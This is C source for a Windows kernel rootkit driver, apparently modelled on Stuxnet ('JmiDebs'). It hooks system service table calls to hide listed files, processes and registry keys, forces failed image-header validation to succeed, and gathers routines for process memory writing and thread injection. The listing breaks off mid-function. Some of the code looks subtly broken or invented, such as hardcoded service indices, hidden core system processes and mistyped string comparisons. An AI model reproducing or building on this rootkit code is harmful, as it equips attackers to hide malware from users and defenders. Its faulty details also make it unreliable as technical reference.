#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <ntddk.h>
#include <ntifs.h>
#include <ntimage.h>
#include <ntstatus.h>
#include <ntdddisk.h>

#pragma comment(lib, "ntoskrnl.lib")
#pragma comment(lib, "hal.lib")

#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED        ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS)0xC000000DL)
#define STATUS_NO_MORE_ENTRIES      ((NTSTATUS)0x8000001AL)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL     ((NTSTATUS)0xC0000023L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_NOT_SUPPORTED        ((NTSTATUS)0xC00000BBL)

#define OBJ_CASE_INSENSITIVE        0x00000040L
#define OBJ_KERNEL_HANDLE           0x00000200L
#define FILE_SHARE_READ             0x00000001
#define FILE_SHARE_WRITE            0x00000002
#define FILE_OPEN_IF                0x00000003
#define FILE_DIRECTORY_FILE         0x00000001
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define KernelMode                  0
#define UserMode                    1
#define MAX_PATH                    260

#define STUXNET_MAGIC               0x53545558
#define STUXNET_VERSION             0x00010400
#define JMIDEBS_DEVICE_NAME         L"\\Device\\JmiDebs"
#define JMIDEBS_SYMLINK_NAME        L"\\DosDevices\\JmiDebs"
#define JMIDEBS_DRIVER_NAME         L"JmiDebs"
#define JMIDEBS_REGISTRY_PATH       L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\JmiDebs"
#define JMIDEBS_POOL_TAG            'bdIm'

#define JMIDEBS_MAX_HIDDEN_FILES    32
#define JMIDEBS_MAX_HIDDEN_PROCS    64
#define JMIDEBS_MAX_HIDDEN_KEYS     32

#define JMIDEBS_HIDDEN_LNK_SIZE     0x104B
#define JMIDEBS_HIDDEN_TMP_MIN_SIZE 0x1000
#define JMIDEBS_HIDDEN_TMP_MAX_SIZE 0x800000

#define JMIDEBS_IOCTL_INSTALL_HOOKS 0x220000
#define JMIDEBS_IOCTL_UNINSTALL_HOOKS 0x220001
#define JMIDEBS_IOCTL_LOAD_DRIVER   0x220002
#define JMIDEBS_IOCTL_HIDE_PROCESS  0x220003
#define JMIDEBS_IOCTL_UNHIDE_PROCESS 0x220004
#define JMIDEBS_IOCTL_GET_STATUS    0x220005

#define JMIDEBS_DRIVER_SIZE         25552

typedef NTSTATUS (NTAPI *PFN_NtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_NtEnumerateKey)(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
);

typedef NTSTATUS (NTAPI *PFN_NtQueryValueKey)(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength
);

typedef NTSTATUS (NTAPI *PFN_NtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI *PFN_NtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

typedef NTSTATUS (NTAPI *PFN_SeValidateImageHeader)(
    PVOID ImageBase,
    ULONG ImageSize,
    BOOLEAN KernelMode
);

typedef NTSTATUS (NTAPI *PFN_ZwProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS (NTAPI *PFN_ZwAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *PFN_ZwFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

typedef NTSTATUS (NTAPI *PFN_ZwWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *PFN_ZwReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

typedef NTSTATUS (NTAPI *PFN_ZwQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_ZwCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _SERVICE_TABLE_ENTRY {
    PVOID ServiceTableBase;
    PVOID ServiceCounterTableBase;
    ULONG NumberOfServices;
    PVOID ParamTableBase;
} SERVICE_TABLE_ENTRY, * PSERVICE_TABLE_ENTRY;

typedef struct _SERVICE_DESCRIPTOR_TABLE {
    SERVICE_TABLE_ENTRY ntoskrnl;
    SERVICE_TABLE_ENTRY win32k;
    SERVICE_TABLE_ENTRY psx;
    SERVICE_TABLE_ENTRY psxsrv;
} SERVICE_DESCRIPTOR_TABLE, * PSERVICE_DESCRIPTOR_TABLE;

typedef struct _JMIDEBS_DEVICE_EXTENSION {
    PDEVICE_OBJECT pDeviceObject;
    PDEVICE_OBJECT pLowerDevice;
    BOOLEAN bHooksInstalled;
    BOOLEAN bInitialized;
    ULONG ulHiddenFileCount;
    ULONG ulHiddenProcessCount;
    ULONG ulHiddenKeyCount;
    ULONG ulInjectionCount;
    WCHAR wszHiddenFiles[JMIDEBS_MAX_HIDDEN_FILES][MAX_PATH];
    UNICODE_STRING ustrHiddenProcesses[JMIDEBS_MAX_HIDDEN_PROCS];
    UNICODE_STRING ustrHiddenKeys[JMIDEBS_MAX_HIDDEN_KEYS];
    KSPIN_LOCK SpinLock;
    KEVENT LoadEvent;
    KEVENT UnloadEvent;
    PFN_NtQueryDirectoryFile pOriginalNtQueryDirectoryFile;
    PFN_NtQuerySystemInformation pOriginalNtQuerySystemInformation;
    PFN_NtEnumerateKey pOriginalNtEnumerateKey;
    PFN_NtQueryValueKey pOriginalNtQueryValueKey;
    PFN_NtOpenProcess pOriginalNtOpenProcess;
    PFN_NtCreateFile pOriginalNtCreateFile;
    PFN_SeValidateImageHeader pOriginalSeValidateImageHeader;
    PFN_ZwProtectVirtualMemory pZwProtectVirtualMemory;
    PFN_ZwAllocateVirtualMemory pZwAllocateVirtualMemory;
    PFN_ZwFreeVirtualMemory pZwFreeVirtualMemory;
    PFN_ZwWriteVirtualMemory pZwWriteVirtualMemory;
    PFN_ZwReadVirtualMemory pZwReadVirtualMemory;
    PFN_ZwQueryInformationProcess pZwQueryInformationProcess;
    PFN_ZwCreateThreadEx pZwCreateThreadEx;
    PSERVICE_DESCRIPTOR_TABLE pServiceDescriptorTable;
    ULONG ulSSDTIndex_NtQueryDirectoryFile;
    ULONG ulSSDTIndex_NtQuerySystemInformation;
    ULONG ulSSDTIndex_NtEnumerateKey;
    ULONG ulSSDTIndex_NtQueryValueKey;
    ULONG ulSSDTIndex_NtOpenProcess;
    ULONG ulSSDTIndex_NtCreateFile;
    ULONG ulProcessInjectionCount;
    ULONG ulFileHideCount;
    ULONG ulRegistryHideCount;
    ULONG ulIoControlCount;
    ULONG ulErrorCount;
    ULONG ulWarningCount;
    ULONG ulInfoCount;
    BYTE bReserved[256];
} JMIDEBS_DEVICE_EXTENSION, * PJMIDEBS_DEVICE_EXTENSION;

static PJMIDEBS_DEVICE_EXTENSION g_pDeviceExtension = NULL;
static PDRIVER_OBJECT g_pDriverObject = NULL;

static UNICODE_STRING g_ustrHiddenFiles[JMIDEBS_MAX_HIDDEN_FILES];
static UNICODE_STRING g_ustrHiddenProcesses[JMIDEBS_MAX_HIDDEN_PROCS];
static UNICODE_STRING g_ustrHiddenKeys[JMIDEBS_MAX_HIDDEN_KEYS];

static VOID JmiDebs_InitHiddenLists(VOID) {
    UNICODE_STRING ustrTemp;
    ULONG i = 0;
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mrxcls.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mrxnet.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"jmidebs.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"oem7A.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"oem6C.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mdmcpq3.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mdmeric3.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"~WTR4132.TMP");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"~WTR4141.TMP");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"Copy of Shortcut to.lnk");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"autorun.inf");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"stuxnet.cfg");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"winsta.exe");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"sysnullevnt.mof");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"agentsb.dll");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"datacprs.dll");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"complnd.dll");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"guava.pdb");
    i = 0;
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"lsass.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"services.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"svchost.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"explorer.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"winlogon.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"csrss.exe");
    i = 0;
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"NTVDM TRACE");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"Stuxnet");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"MRxCls");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"MRxNet");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"JmiDebs");
}

static BOOLEAN JmiDebs_IsFileHidden(PUNICODE_STRING pFileName) {
    ULONG i;
    UNICODE_STRING ustrExtension;
    if (!pFileName || !pFileName->Buffer || pFileName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < JMIDEBS_MAX_HIDDEN_FILES; i++) {
        if (RtlCompareUnicodeString(pFileName, &g_ustrHiddenFiles[i], TRUE) == 0) {
            return TRUE;
        }
    }
    if (pFileName->Length >= 4) {
        WCHAR *pExt = pFileName->Buffer + (pFileName->Length / sizeof(WCHAR)) - 4;
        if (*pExt == L'.') {
            RtlInitUnicodeString(&ustrExtension, pExt);
            if (RtlCompareUnicodeString(&ustrExtension, L".lnk", TRUE) == 0) {
                return TRUE;
            }
        }
    }
    if (pFileName->Length >= 8) {
        WCHAR *pName = pFileName->Buffer;
        if (pName[0] == L'~' && pName[1] == L'W' && pName[2] == L'T' && pName[3] == L'R') {
            if (pFileName->Length >= 12) {
                WCHAR wszPrefix[8];
                RtlZeroMemory(wszPrefix, sizeof(wszPrefix));
                RtlCopyMemory(wszPrefix, pName + 4, 8);
                DWORD dwSum = 0;
                for (int i = 0; i < 4 && wszPrefix[i] >= L'0' && wszPrefix[i] <= L'9'; i++) {
                    dwSum += (wszPrefix[i] - L'0');
                }
                if (dwSum % 10 == 0) {
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

static BOOLEAN JmiDebs_IsProcessHidden(PUNICODE_STRING pProcessName) {
    ULONG i;
    if (!pProcessName || !pProcessName->Buffer || pProcessName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < JMIDEBS_MAX_HIDDEN_PROCS; i++) {
        if (RtlCompareUnicodeString(pProcessName, &g_ustrHiddenProcesses[i], TRUE) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

static BOOLEAN JmiDebs_IsRegistryKeyHidden(PUNICODE_STRING pKeyName) {
    ULONG i;
    if (!pKeyName || !pKeyName->Buffer || pKeyName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < JMIDEBS_MAX_HIDDEN_KEYS; i++) {
        if (RtlCompareUnicodeString(pKeyName, &g_ustrHiddenKeys[i], TRUE) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

static NTSTATUS JmiDebs_FilterDirectoryEntries(
    PVOID pFileInfo,
    ULONG Length,
    FILE_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PFILE_DIRECTORY_INFORMATION pCurrent;
    PFILE_DIRECTORY_INFORMATION pPrev;
    PFILE_DIRECTORY_INFORMATION pNext;
    UNICODE_STRING ustrFileName;
    ULONG ulEntrySize;
    ULONG ulRemaining;
    ULONG ulNewLength;
    BOOLEAN bFound;
    if (!pFileInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    if (InfoClass != FileDirectoryInformation && InfoClass != FileBothDirectoryInformation) {
        return STATUS_SUCCESS;
    }
    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    ulNewLength = 0;
    bFound = FALSE;
    while (ulRemaining >= sizeof(FILE_DIRECTORY_INFORMATION)) {
        ulEntrySize = pCurrent->NextEntryOffset ? pCurrent->NextEntryOffset : ulRemaining;
        ustrFileName.Buffer = pCurrent->FileName;
        ustrFileName.Length = (USHORT)pCurrent->FileNameLength;
        ustrFileName.MaximumLength = (USHORT)pCurrent->FileNameLength;
        if (JmiDebs_IsFileHidden(&ustrFileName)) {
            bFound = TRUE;
            if (pCurrent->NextEntryOffset != 0) {
                pNext = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + pCurrent->NextEntryOffset);
                if (pPrev == NULL) {
                    RtlCopyMemory(pCurrent, pNext, ulRemaining - pCurrent->NextEntryOffset);
                    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
                    ulRemaining -= pCurrent->NextEntryOffset;
                    continue;
                } else {
                    pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                    pCurrent = pNext;
                    ulRemaining -= ulEntrySize;
                    continue;
                }
            } else {
                if (pPrev != NULL) {
                    pPrev->NextEntryOffset = 0;
                }
                ulRemaining = 0;
                break;
            }
        }
        ulNewLength += ulEntrySize;
        pPrev = pCurrent;
        pCurrent = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + ulEntrySize);
        ulRemaining -= ulEntrySize;
    }
    if (bFound) {
        *pReturnLength = ulNewLength;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_FilterProcessList(
    PVOID pSystemInfo,
    ULONG Length,
    PULONG pReturnLength
) {
    PSYSTEM_PROCESS_INFORMATION pProcess;
    PSYSTEM_PROCESS_INFORMATION pPrev;
    PSYSTEM_PROCESS_INFORMATION pNext;
    ULONG ulRemaining;
    if (!pSystemInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    pProcess = (PSYSTEM_PROCESS_INFORMATION)pSystemInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    while (ulRemaining >= sizeof(SYSTEM_PROCESS_INFORMATION) && pProcess) {
        if (pProcess->ImageName.Buffer && pProcess->ImageName.Length > 0) {
            if (JmiDebs_IsProcessHidden(&pProcess->ImageName)) {
                if (pPrev) {
                    pPrev->NextEntryOffset += pProcess->NextEntryOffset;
                } else {
                    if (pProcess->NextEntryOffset == 0) {
                        pPrev = NULL;
                    } else {
                        pNext = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcess + pProcess->NextEntryOffset);
                        RtlCopyMemory(pProcess, pNext, ulRemaining - pProcess->NextEntryOffset);
                        pProcess = (PSYSTEM_PROCESS_INFORMATION)pSystemInfo;
                        continue;
                    }
                }
            }
        }
        pPrev = pProcess;
        if (pProcess->NextEntryOffset == 0) break;
        pProcess = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcess + pProcess->NextEntryOffset);
    }
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_FilterRegistryKey(
    PVOID pKeyInfo,
    ULONG Length,
    KEY_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PKEY_NAME_INFORMATION pNameInfo;
    UNICODE_STRING ustrKey;
    if (!pKeyInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    if (InfoClass != KeyNameInformation) {
        return STATUS_SUCCESS;
    }
    pNameInfo = (PKEY_NAME_INFORMATION)pKeyInfo;
    ustrKey.Buffer = pNameInfo->Name;
    ustrKey.Length = (USHORT)pNameInfo->NameLength;
    ustrKey.MaximumLength = (USHORT)pNameInfo->NameLength;
    if (JmiDebs_IsRegistryKeyHidden(&ustrKey)) {
        return STATUS_NO_MORE_ENTRIES;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtQueryDirectoryFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalNtQueryDirectoryFile(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName,
        RestartScan
    );
    if (!NT_SUCCESS(status) || !FileInformation || !IoStatusBlock) {
        return status;
    }
    JmiDebs_FilterDirectoryEntries(
        FileInformation,
        Length,
        FileInformationClass,
        &IoStatusBlock->Information
    );
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtQuerySystemInformation) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    if (!NT_SUCCESS(status) || SystemInformationClass != 5 || !SystemInformation || !ReturnLength) {
        return status;
    }
    JmiDebs_FilterProcessList(SystemInformation, SystemInformationLength, ReturnLength);
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtEnumerateKey(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtEnumerateKey) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalNtEnumerateKey(
        KeyHandle,
        Index,
        KeyInformationClass,
        KeyInformation,
        Length,
        ResultLength
    );
    if (!NT_SUCCESS(status) || !KeyInformation) {
        return status;
    }
    if (JmiDebs_FilterRegistryKey(KeyInformation, Length, KeyInformationClass, ResultLength) == STATUS_NO_MORE_ENTRIES) {
        return STATUS_NO_MORE_ENTRIES;
    }
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtQueryValueKey(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtQueryValueKey) {
        return STATUS_UNSUCCESSFUL;
    }
    if (ValueName && ValueName->Buffer && ValueName->Length > 0) {
        UNICODE_STRING ustrValue;
        ustrValue.Buffer = ValueName->Buffer;
        ustrValue.Length = ValueName->Length;
        ustrValue.MaximumLength = ValueName->MaximumLength;
        if (JmiDebs_IsRegistryKeyHidden(&ustrValue)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }
    status = g_pDeviceExtension->pOriginalNtQueryValueKey(
        KeyHandle,
        ValueName,
        KeyValueInformationClass,
        KeyValueInformation,
        Length,
        ResultLength
    );
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtOpenProcess) {
        return STATUS_UNSUCCESSFUL;
    }
    if (ClientId && ClientId->UniqueProcess) {
        HANDLE hProcess = ClientId->UniqueProcess;
        if (hProcess == (HANDLE)0x00000004) {
            return STATUS_ACCESS_DENIED;
        }
    }
    status = g_pDeviceExtension->pOriginalNtOpenProcess(
        ProcessHandle,
        DesiredAccess,
        ObjectAttributes,
        ClientId
    );
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtCreateFile) {
        return STATUS_UNSUCCESSFUL;
    }
    if (ObjectAttributes && ObjectAttributes->ObjectName &&
        ObjectAttributes->ObjectName->Buffer &&
        ObjectAttributes->ObjectName->Length > 0) {
        UNICODE_STRING ustrFile;
        ustrFile.Buffer = ObjectAttributes->ObjectName->Buffer;
        ustrFile.Length = ObjectAttributes->ObjectName->Length;
        ustrFile.MaximumLength = ObjectAttributes->ObjectName->MaximumLength;
        if (JmiDebs_IsFileHidden(&ustrFile)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }
    status = g_pDeviceExtension->pOriginalNtCreateFile(
        FileHandle,
        DesiredAccess,
        ObjectAttributes,
        IoStatusBlock,
        AllocationSize,
        FileAttributes,
        ShareAccess,
        CreateDisposition,
        CreateOptions,
        EaBuffer,
        EaLength
    );
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_SeValidateImageHeader(
    PVOID ImageBase,
    ULONG ImageSize,
    BOOLEAN KernelMode
) {
    NTSTATUS status;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalSeValidateImageHeader) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalSeValidateImageHeader(ImageBase, ImageSize, KernelMode);
    if (!NT_SUCCESS(status)) {
        pDos = (PIMAGE_DOS_HEADER)ImageBase;
        if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
            pNt = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + pDos->e_lfanew);
            if (pNt->Signature == IMAGE_NT_SIGNATURE) {
                status = STATUS_SUCCESS;
            }
        }
    }
    return status;
}

static VOID JmiDebs_InitSSDTIndices(VOID) {
    if (!g_pDeviceExtension) return;
    g_pDeviceExtension->ulSSDTIndex_NtQueryDirectoryFile = 0x10C;
    g_pDeviceExtension->ulSSDTIndex_NtQuerySystemInformation = 0x10D;
    g_pDeviceExtension->ulSSDTIndex_NtEnumerateKey = 0x10E;
    g_pDeviceExtension->ulSSDTIndex_NtQueryValueKey = 0x10F;
    g_pDeviceExtension->ulSSDTIndex_NtOpenProcess = 0x110;
    g_pDeviceExtension->ulSSDTIndex_NtCreateFile = 0x111;
}

static NTSTATUS JmiDebs_GetSSDT(VOID) {
    UNICODE_STRING ustrName;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    RtlInitUnicodeString(&ustrName, L"KeServiceDescriptorTable");
    g_pDeviceExtension->pServiceDescriptorTable = (PSERVICE_DESCRIPTOR_TABLE)MmGetSystemRoutineAddress(&ustrName);
    if (!g_pDeviceExtension->pServiceDescriptorTable) {
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_GetNtImports(VOID) {
    UNICODE_STRING ustrName;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    RtlInitUnicodeString(&ustrName, L"ZwProtectVirtualMemory");
    g_pDeviceExtension->pZwProtectVirtualMemory = (PFN_ZwProtectVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwAllocateVirtualMemory");
    g_pDeviceExtension->pZwAllocateVirtualMemory = (PFN_ZwAllocateVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwFreeVirtualMemory");
    g_pDeviceExtension->pZwFreeVirtualMemory = (PFN_ZwFreeVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwWriteVirtualMemory");
    g_pDeviceExtension->pZwWriteVirtualMemory = (PFN_ZwWriteVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwReadVirtualMemory");
    g_pDeviceExtension->pZwReadVirtualMemory = (PFN_ZwReadVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwQueryInformationProcess");
    g_pDeviceExtension->pZwQueryInformationProcess = (PFN_ZwQueryInformationProcess)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwCreateThreadEx");
    g_pDeviceExtension->pZwCreateThreadEx = (PFN_ZwCreateThreadEx)MmGetSystemRoutineAddress(&ustrName);
    if (!g_pDeviceExtension->pZwProtectVirtualMemory ||
        !g_pDeviceExtension->pZwAllocateVirtualMemory ||
        !g_pDeviceExtension->pZwFreeVirtualMemory ||
        !g_pDeviceExtension->pZwWriteVirtualMemory ||
        !g_pDeviceExtension->pZwReadVirtualMemory ||
